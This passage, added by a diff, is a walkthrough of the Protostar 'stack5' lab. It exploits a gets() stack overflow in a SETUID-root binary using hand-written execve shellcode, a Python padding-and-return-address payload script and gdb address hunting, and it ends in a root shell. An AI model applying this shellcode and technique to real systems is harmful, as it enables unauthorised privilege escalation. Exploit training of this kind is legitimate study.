@@ -1026,3 +1026,320 @@ Segmentation fault
 ```
 
 Success.
+
+### Stack 5
+
+Stack5 is a standard buffer overflow, this time introducing shellcode.
+
+This level is at /opt/protostar/bin/stack5
+
+Hints
+
+- At this point in time, it might be easier to use someone elses shellcode
+- If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
+- remove the int3s once your shellcode is done.
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+```
+
+Now we don't even have a function to jump to. We have to use a shellcode this time.
+
+Can we exploit this executable to get a root shell? Let's check if it's SETUID:
+
+```
+user@protostar:/opt/protostar/bin$ ls -la stack5
+-rwsr-xr-x 1 root root 22612 Nov 24  2011 stack5
+```
+
+It is! Our executable is SETUID and the owner is `root`. If we write a shellcode that opens a shell, such shell would be executing with root privileges!
+
+If we could write it in C, it would be something like this:
+```
+execve(“/bin/sh”);
+exit(0);
+```
+
+But if we put C code into the stack, it won't execute because it's not compiled. We have to write it in Assembly.
+
+If you want to study because you want to be able to write your own shellcode in hope to not be a script kiddie anymore, you can learn something [here](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux).
+
+Anyway, let's have a glance at the `man execve` entry. We have to check what parameters are expected by the function:
+
+```
+...
+int execve(const char *filename, char *const argv[], char *const envp[]);
+...
+```
+
+So we have three parameters:
+- `filename` will be `/bin/sh`;
+- `argv` and `envp` will be `NULL`.
+
+Before writing the shellcode, we have to pay attention to two things:
+1. It must not contain null bytes, because they would be interpreted as string terminators;
+2. It must be as big as the memory area we can override before the return address at max.
+
+How big is such memory area? On this CTF the stack grows like the previous challenge:
+
+```
++---------------------------------------------------------------------------------------------------------------------------------------+
+| buffer ptr (4 bytes) | empty memory (12 bytes) | buffer (64 bytes) | padding (8 bytes) | old ebp (4 bytes) | return address (4 bytes) |  
++---------------------------------------------------------------------------------------------------------------------------------------+
+```
+
+So we still have 64 + 8 + 4 = 76 bytes before the return address. Our shellcode must be 76 bytes at max.
+
+Let's write it:
+
+```
+shellcode:
+    xor     %eax, %eax      # eax is zeroed (it will be useful)
+    push    %eax            # "\0" is pushed
+    push    $0x68732f2f     # encoding of "//sh" is pushed
+    push    $0x6e69622f     # encoding of "/bin" is pushed
+    mov     %esp, %ebx      # first argument of execve (the /bin//sh\0 string)
+    mov     %eax, %ecx      # second argument of execve (NULL)
+    mov     %eax, %edx      # third argument of execve (NULL)
+    mov     $0xb, %al       # "11" is put into eax (11 is the code for execve)
+    int     $0x80           # execve is called
+    xor     %eax, %eax      # eax is zeroed again
+    inc     %eax            # eax is incremented (1 is the code for exit)
+    int     $0x80           # exit is called
+```
+
+Now we can compile it:
+
+```
+gcc -m32 -c shellcode.s -o shellcode.o
+```
+
+We have to put the hexadecimal into the stack. We can obtain it with `objdump`:
+
+```
+user@protostar:~$ objdump --disassemble shellcode.o
+
+shellcode.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <shellcode>:
+   0:   31 c0                   xor    %eax,%eax
+   2:   50                      push   %eax
+   3:   68 2f 2f 73 68          push   $0x68732f2f
+   8:   68 2f 62 69 6e          push   $0x6e69622f
+   d:   89 e3                   mov    %esp,%ebx
+   f:   89 c1                   mov    %eax,%ecx
+  11:   89 c2                   mov    %eax,%edx
+  13:   b0 0b                   mov    $0xb,%al
+  15:   cd 80                   int    $0x80
+  17:   31 c0                   xor    %eax,%eax
+  19:   40                      inc    %eax
+  1a:   cd 80                   int    $0x80
+
+```
+
+So our hex will be:
+
+```
+“\x31\xc0\x50\x68\x2f\x2f\x73”
+“\x68\x68\x2f\x62\x69\x6e\x89”
+“\xe3\x89\xc1\x89\xc2\xb0\x0b"
+"\xcd\x80\x31\xc0\x40\xcd\x80”
+```
+
+It's 28 bytes, so it can be used.
+
+For now let's write a simple python script. We will be tailoring it while we go further:
+```
+#! /usr/bin/python
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
+            "\x68\x68\x2f\x62\x69\x6e\x89" + \
+            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
+            "\xcd\x80\x31\xc0\x40\xcd\x80"
+            
+print shellcode
+```
+
+For now, we can save its output into a file:
+
+```
+user@protostar:~$ python stack5-payload-simple.py > /tmp/payload
+```
+
+Now we have to get the address of the buffer.
+
+A little note: Since the environment affect the addresses, from now on we'll be using `dash`. It's not as interactive as `bash`, but its environment is easier to handle. 
+
+Let's run `stack5` with `gdb` and the `payload` file. :
+
+```
+$ gdb -q /opt/protostar/bin/stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) disass main
+Dump of assembler code for function main:
+0x080483c4 <main+0>:    push   %ebp
+0x080483c5 <main+1>:    mov    %esp,%ebp
+0x080483c7 <main+3>:    and    $0xfffffff0,%esp
+0x080483ca <main+6>:    sub    $0x50,%esp
+0x080483cd <main+9>:    lea    0x10(%esp),%eax
+0x080483d1 <main+13>:   mov    %eax,(%esp)
+0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
+0x080483d9 <main+21>:   leave  
+0x080483da <main+22>:   ret    
+End of assembler dump.
+(gdb) b * 0x080483d9
+Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
+(gdb) r < /tmp/payload 
+Starting program: /opt/protostar/bin/stack5 < /tmp/payload
+
+Breakpoint 1, main (argc=0, argv=0xbffffd94) at stack5/stack5.c:11
+11      stack5/stack5.c: No such file or directory.
+        in stack5/stack5.c
+(gdb) x/a $esp
+0xbffffc90:     0xbffffca0
+```
+
+Now, we can see that the buffer is located at `0xbffffca0` (remember the `mov %eax,(%esp)` operation?), and we can see that our shellcode is inside the buffer.
+
+The last thing to do is to override the return address with `0xbffffca0`. As we said before, from the beginning of the buffer and the return address to `__libc_start_main` we have 76 bytes.
+
+28 of these bytes are occupied by the shellcode. Now we just have to tweak our script to print some padding and inject the return address after that:
+
+```
+#! /usr/bin/python
+
+length = 76
+ret = "\xa0\xfc\xff\xbf"
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
+            "\x68\x68\x2f\x62\x69\x6e\x89" + \
+            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
+            "\xcd\x80\x31\xc0\x40\xcd\x80"
+
+pad = 'a' * (length - len(shellcode))
+payload = shellcode + pad + ret
+
+print payload
+```
+
+Let's save its output on `/tmp/payload` again.
+
+
+Now we can try to run it into gdb:
+
+```
+$ gdb -q /opt/protostar/bin/stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) r < /tmp/payload
+Starting program: /opt/protostar/bin/stack5 < /tmp/payload
+Executing new program: /bin/dash
+
+Program exited normally.
+```
+
+The shell is called, but it exits immediately...
+
+What if we run it onto the terminal?
+
+```
+$ /opt/protostar/bin/stack5 < /tmp/payload
+Illegal instruction
+```
+
+Wtf? We get an error...
+
+Actually, `gdb` changes the environment, so the memory addresses are shifted by a certain amount.
+
+Look at this:
+
+```
+$ env
+USER=user
+SSH_CLIENT=192.168.56.1 49258 22
+MAIL=/var/mail/user
+HOME=/home/user
+SSH_TTY=/dev/pts/0
+LOGNAME=user
+TERM=xterm-256color
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+LANG=en_US.UTF-8
+SHELL=/bin/sh
+PWD=/home/user
+SSH_CONNECTION=192.168.56.1 49258 192.168.56.102 22
+```
+
+```
+$ gdb -q /opt/protostar/bin/stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) show env
+USER=user
+SSH_CLIENT=192.168.56.1 49258 22
+MAIL=/var/mail/user
+HOME=/home/user
+SSH_TTY=/dev/pts/0
+LOGNAME=user
+TERM=xterm-256color
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+LANG=en_US.UTF-8
+SHELL=/bin/sh
+PWD=/home/user
+SSH_CONNECTION=192.168.56.1 49258 192.168.56.102 22
+LINES=23
+COLUMNS=96
+```
+
+Two new environment variables! In order to find the correct buffer address, we have to unset these.
+
+A little notice: USE THE SAME WORKING DIRECTORY because of `PWD`:
+
+```
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+```
+
+Now we can find the correct address.
+
+```
+...
+(gdb) x/32x $esp
+0xbffffca0:     0xbffffcb0      0xb7ec6165      0xbffffcb8      0xb7eada75
+0xbffffcb0:     0x6850c031      0x68732f2f      0x69622f68      0x89e3896e
+0xbffffcc0:     0xb0c289c1      0x3180cd0b      0x80cd40c0      0x61616161
+0xbffffcd0:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffce0:     0x61616161      0x61616161      0x61616161      0x61616161
+...
+```
+
+It's `0xbffffcb0`! Let's try performing the attack with the updated script.
+
+```
+$ /opt/protostar/bin/stack5 < /tmp/payload
+$ 
+```
+
+Nothing happens...
+
+Here's the caveat: When the shell is launched, it's launched in interactive mode. It expects inputs from the `stdin`, but the latter is empty, so the shell gets `EOF` and it terminates.
+
+Do we have a workaround? Of course we do. We can use two `cat`: one to inject the payload, and the other one to keep a stream open:
+
+```
+$ (cat /tmp/payload; cat) | /opt/protostar/bin/stack5
+whoami
+root
+```
+
+Hell yeah!
